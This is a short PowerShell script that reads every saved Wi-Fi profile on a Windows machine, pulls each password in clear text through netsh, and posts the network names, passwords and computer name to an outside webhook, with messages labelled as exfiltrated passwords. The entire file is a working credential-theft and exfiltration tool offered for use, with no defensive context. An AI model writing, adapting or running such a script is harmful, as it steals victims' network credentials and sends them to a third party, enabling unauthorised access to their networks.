#Insert your webhook here
$webhookUri = 'XXXXXXXXXXXXX'
#Get List of SSIDS
$SSIDS = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+"
#A loop to get password for each SSID
$WifiInfo = foreach($SSID in $SSIDS) {
    $Password = (netsh wlan show profiles name=$SSID key=clear | Select-String '{LANG VALUE}') -replace ".*:\s+"
    New-Object -TypeName psobject -Property @{"SSID"=$SSID;"Password"=$Password}
    $Body = @{
   'username' = 'Agent'
   'content' = 'Wifi passwords exfiltrated from :  ' + '     ' +   $env:computername + ' Network :   ' + $SSID + '   ' + ' Password :   ' + $Password
   }
    Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
}  
